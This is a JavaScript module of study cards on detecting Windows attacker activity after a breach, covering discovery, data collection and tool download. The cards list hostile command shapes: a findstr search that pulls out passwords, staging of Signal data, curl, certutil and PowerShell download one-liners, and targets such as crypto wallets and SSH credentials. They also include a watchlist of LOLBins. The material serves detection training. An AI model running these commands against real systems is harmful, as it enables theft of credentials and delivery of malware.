export default {
  id: "windows-post-access",
  title: "Discovery, Collection & Ingress Tool Transfer",
  src: "Windows Threat Detection 2",
  icon: "🧭",
  cards: [
    {
      title: "Discovery — command reference by goal",
      span2: true,
      blocks: [
        { t: "txt", text: "After Initial Access the attacker doesn't know the environment yet. Discovery (MITRE tactic) answers \"who am I, where am I, what's this worth, what's watching me\" — applies to a human operator on RDP just as much as an automated phishing payload waking up on a fresh victim." },
        { t: "table", head: ["Discovery goal", "Common commands"], rows: [
          ["Host purpose / victim's role", "Get-Content, dir / Get-ChildItem on files & folders"],
          ["Users & privileges", "whoami, net user, net localgroup, query user, Get-LocalUser"],
          ["Installed apps / vulnerable software", "systeminfo, wmic product get name,version, Get-Service"],
          ["Network / corporate membership", "ipconfig /all, netstat, netsh advfirewall show allprofiles"],
          ["Active AV / security tooling", "Get-WmiObject -Namespace root\\SecurityCenter2 -Query \"select * from AntivirusProduct\""],
        ]},
        { t: "note", kind: "warn", title: "AV enumeration is a go/no-go check, not just recon", text: "Malware will self-delete rather than proceed if a dangerous AV/EDR is present, or if the victim doesn't match a targeted company/country. Some Discovery activity is genuinely never followed by anything else — no \"phase 2\" doesn't mean the Discovery commands weren't real." },
      ],
    },
    {
      title: "Discovery — CLI vs. GUI, and the core detection technique",
      span2: true,
      blocks: [
        { t: "table", head: ["Mode", "Visibility", "Detection difficulty"], rows: [
          ["CLI-driven", "Sysmon Event ID 1 (process creation), or new lines in the PowerShell history file", "easier — commands exist by default on every box, fully logged as process creation"],
          ["GUI-driven (interactive access, e.g. post-RDP)", "process tree like explorer.exe → cmd.exe → mmc.exe (Computer Management), or Settings/Task Manager launches", "harder — indistinguishable in isolation from a legitimate admin doing legitimate admin things"],
        ]},
        { t: "note", kind: "info", title: "the core technique — correlate ProcessId ↔ ParentProcessId", text: "Given a suspicious process (e.g. ipconfig.exe, PID 1830), look up its ParentProcessId (1801) to find what launched it (cmd.exe), then repeat on that process's parent — walking backward until you hit the root cause (ipconfig.exe ← cmd.exe ← invoice.pdf.exe). General-purpose version of the same pivot used for RDP's Logon ID and the phishing Sysmon event chain — usable for any process-ancestry question." },
        { t: "note", kind: "warn", title: "don't over-flag legitimate admin activity", text: "ipconfig and friends are used constantly by IT/co-workers. What makes it suspicious is context: a sequence of multiple Discovery commands in a short window, especially tracing back to an abnormal parent process." },
      ],
    },
    {
      title: "Collection — targets & exfil channels",
      span2: true,
      blocks: [
        { t: "table", head: ["Motive", "Example targets"], rows: [
          ["Personal / blackmail", "photos, chat history (AppData\\Roaming\\Signal), browser history (AppData\\Local\\Google\\Chrome\\User Data\\Default\\History)"],
          ["Financial", "crypto wallets (wallet.dat), banking/web sessions via browser cookies"],
          ["Corporate", "SSH credentials, database credentials (e.g. MSSQL config/connection info)"],
        ]},
        { t: "note", kind: "warn", title: "secrets aren't just files", text: "Registry and process memory are valid collection targets too — a detection strategy built only around file-access monitoring has a blind spot here." },
        { t: "txt", text: "Exfiltration is mandatory regardless of method (scripted, usually under a minute; or human-operator, can take hours of file review). Attackers route it through trusted-looking channels to blend into normal traffic: legitimate cloud storage (Dropbox, Mega, S3), code repos (GitHub), messaging apps (Telegram), or lookalike domains styled to pass a casual glance (e.g. windows-updates.com)." },
      ],
    },
    {
      title: "Collection — detection commands",
      blocks: [
        { t: "table", head: ["Command pattern", "What it's doing"], rows: [
          ["notepad.exe ...\\finances-2025.csv", "manually reviewing a specific interesting file"],
          ["type debug_logs | findstr password > %TEMP%\\password.txt", "grepping a file for \"password\", staging the hits"],
          ["Get-ChildItem -Recurse -Filter *.pdf", "sweeping the home directory for a document type"],
          ["Copy-Item ...\\AppData\\Roaming\\Signal ...\\Temp\\", "staging an app's data into a temp working directory"],
          ["Compress-Archive / 7z.exe", "zipping staged data in prep for exfil"],
        ]},
        { t: "note", kind: "danger", title: "human-driven vs. automated stealer — a real detection gap", text: "Human-operator Collection (large, high-value breaches) uses ordinary tools (Notepad, 7-Zip) — fully visible via Sysmon ID 1. Purpose-built data stealers (e.g. Gremlin — VPN profiles, crypto wallets, Steam/Discord/Telegram sessions, screenshots) rarely shell out to cmd/PowerShell at all, running their own internal code instead. No readable command line reveals what was targeted — you're left inferring from file-system/network artifacts, not clean command telemetry." },
      ],
    },
    {
      title: "Ingress Tool Transfer — why attackers stage tools post-breach",
      blocks: [
        { t: "txt", text: "Downloading additional tooling <b>after</b> the initial foothold, rather than shipping everything in the first payload — used in the majority of real breaches. Two reasons: splitting malware across stages helps dodge AV (a tiny dropper is less likely to trip signatures than a fully-loaded bundle), and it minimizes exposure if the initial dropper gets caught early." },
        { t: "table", head: ["Stage", "Example tool"], rows: [
          ["Discovery automation", "Seatbelt"],
          ["Credential extraction", "Mimikatz"],
          ["Remote access", "RemcosRAT"],
          ["Impact", "ransomware binary"],
        ]},
      ],
    },
    {
      title: "Ingress Tool Transfer — native / LOLBin download methods",
      blocks: [
        { t: "table", head: ["Method", "Command shape"], rows: [
          ["Web browser", "navigate directly to the URL"],
          ["curl.exe", "curl.exe <url> -o mal.exe"],
          ["certutil.exe", "certutil.exe -urlcache -f <url> <outfile>"],
          ["PowerShell", "Invoke-WebRequest '<url>' -OutFile <file>"],
        ]},
        { t: "note", kind: "danger", title: "certutil — a genuine LOLBin", text: "A legitimate, signed, built-in cert-management utility with no obvious reason to touch the network — its -urlcache -f flags fetch a URL anyway. A signed Microsoft binary making an outbound HTTP request reads as far less suspicious than an unrecognized .exe doing the same. Keep it on a watchlist of \"binaries with no legitimate reason to make HTTP requests\" (rundll32, mshta, same category)." },
        { t: "note", kind: "info", title: "detecting it", text: "Track network connections/DNS requests from a suspicious process, then correlate: which process made the connection, the destination domain, and the file that landed on disk. Attackers often host payloads on legitimate services (GitHub) specifically to blend in — domain reputation alone isn't reliable." },
      ],
    },
  ],
};
